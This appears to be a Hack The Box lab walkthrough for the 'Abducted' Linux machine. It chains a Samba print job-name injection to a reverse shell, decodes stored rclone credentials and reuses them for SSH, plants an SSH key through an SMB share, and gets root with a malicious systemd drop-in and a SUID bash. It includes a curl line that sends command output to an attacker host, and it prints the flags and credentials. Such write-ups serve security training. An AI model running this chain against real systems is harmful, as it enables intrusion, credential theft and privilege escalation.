# HTB Abducted - Medium Linux - Walkthrough

**IP:** 10.129.244.177  
**OS:** Linux (Ubuntu)  
**Difficulty:** Medium  
**Date:** 2026-06-08  
**Flags:**
- user.txt: `d5bc0cacd2bc828961ff282ded017c66`
- root.txt: `d854f2573df1790f4adf36c1c6af6a2c`

---

## 1. Recon

```
/etc/hosts: 10.129.244.177  abducted.htb
```

**nmap:**
```
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

**SMB null session:**
```bash
smbclient -L //10.129.244.177 -N
```
Shares: `HP-Reception` (Printer), `projects` (Disk, scott only), `transfer` (Disk, scott only, force user=marcus), `IPC$`

---

## 2. Foothold - CVE-2026-4480 (Samba print %J injection)

**CVE:** Samba print command injects client-supplied job name (`%J`) into `system()` unescaped. Metacharacters (`|`, `;`, etc.) reach the shell.

**Samba config (relevant):**
```ini
[global]
   printing = sysv
   guest account = nobody

[HP-Reception]
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
```

`printaudit %J %s` with job name `|sh` becomes: `/usr/local/bin/printaudit |sh /var/spool/samba/smbprn.xxx`  
→ `sh` executes the spool file as a script (the spool file body = our payload).

**PoC:** https://github.com/TheCyberGeek/CVE-2026-4480-PoC

```bash
# Install dependency
sudo apt install python3-samba

# Fire reverse shell (pre-auth, as nobody)
nc -lvnp 4444 &
python3 exploit.py 10.129.244.177 10.10.14.206 4444
# → shell as nobody
```

**Blind command execution (no listener needed):**
```bash
python3 exploit.py 10.129.244.177 x 0 -c "curl -s http://LHOST:8888/\$(id | base64 -w0) &"
```

---

## 3. Enumeration as nobody

**Users:** `scott` (uid=1000), `marcus` (uid=1001, groups=operators)

**SMB config `/etc/samba/shares.conf`:**
```ini
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus
   wide links = yes

[projects]
   path = /srv/projects
   valid users = scott
```

**Key file:** `/opt/offsite-backup/rclone.conf`
```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw  (rclone-obscured)
```

**Decode rclone obscured password on target:**
```bash
# Via nobody RCE:
rclone reveal 'HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw'
# → iXzvcib3SrpZ
```

---

## 4. Lateral Move - scott via SMB credentials

The rclone password `iXzvcib3SrpZ` is reused as scott's SSH/SMB password.

```bash
sshpass -p 'iXzvcib3SrpZ' ssh scott@10.129.244.177
cat ~/user.txt
# → d5bc0cacd2bc828961ff282ded017c66
```

Also works for SMB access to `transfer` and `projects` shares.

---

## 5. Lateral Move - marcus via SMB wide-links + force user

The `transfer` share has:
- `force user = marcus` → SMB writes happen as marcus
- `wide links = yes` → symlinks outside share root are followed

**Attack:** Mount the share and write SSH key into marcus's home (via the existing `marcus_home → /home/marcus` symlink):
```bash
sudo mkdir /mnt/transfer
sudo mount -t cifs //10.129.244.177/transfer /mnt/transfer -o username=scott,password=iXzvcib3SrpZ,vers=2.0
sudo mkdir -p /mnt/transfer/marcus_home/.ssh
sudo cp ~/.ssh/id_rsa.pub /mnt/transfer/marcus_home/.ssh/authorized_keys
sudo chmod 600 /mnt/transfer/marcus_home/.ssh/authorized_keys
ssh marcus@10.129.244.177 -i ~/.ssh/id_rsa
```
File is created as marcus (force user), so marcus can SSH in.

---

## 6. Privesc - systemd smbd.service.d drop-in (operators group)

Marcus is in the `operators` group, which has write access to `/etc/systemd/system/smbd.service.d/` (mode `2770 root:operators`).

**Write malicious drop-in:**
```bash
cat > /etc/systemd/system/smbd.service.d/payload.conf << 'EOF'
[Service]
ExecStartPost=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"
Restart=on-failure
RestartSec=1s
EOF
```

**Apply and trigger (marcus can run both without sudo):**
```bash
systemctl daemon-reload
systemctl restart smbd
```

**Get root:**
```bash
/tmp/rootbash -p -c 'id; cat /root/root.txt'
# → euid=0(root)
# → d854f2573df1790f4adf36c1c6af6a2c
```

---

## Chain Summary

```
SMB null session → HP-Reception printer share (guest ok)
→ CVE-2026-4480: job name |sh → print command injection → RCE as nobody
→ read /opt/offsite-backup/rclone.conf → rclone reveal → iXzvcib3SrpZ
→ SSH as scott (password reuse) → user.txt
→ Mount transfer share (force user=marcus, wide links) → write SSH key to marcus's home
→ SSH as marcus → operators group → write smbd.service.d drop-in
→ systemctl daemon-reload + restart smbd → ExecStartPost: SUID bash
→ /tmp/rootbash -p → root → root.txt
```

---

## Key Techniques

1. **CVE-2026-4480**: Samba `%J` (job name) in `print command` → unescaped shell injection via `system()`. Requires `printing = sysv` and a print command referencing `%J`. Exploit uses `samba.dcerpc.spoolss` Python bindings.
2. **rclone obscured password decoding**: `rclone reveal '<obscured>'` decodes the AES-CTR obscured password stored in rclone.conf.
3. **SMB wide links + force user**: `wide links = yes` allows following symlinks outside the share root; `force user = marcus` means file ops happen as marcus - chain both to write arbitrary files as marcus.
4. **systemd drop-in via group write**: Writable `service.d/` directory + `systemctl daemon-reload` + `systemctl restart <service>` = code execution as root without sudo. Both daemon-reload and restart work without authentication for non-privileged users on this system.
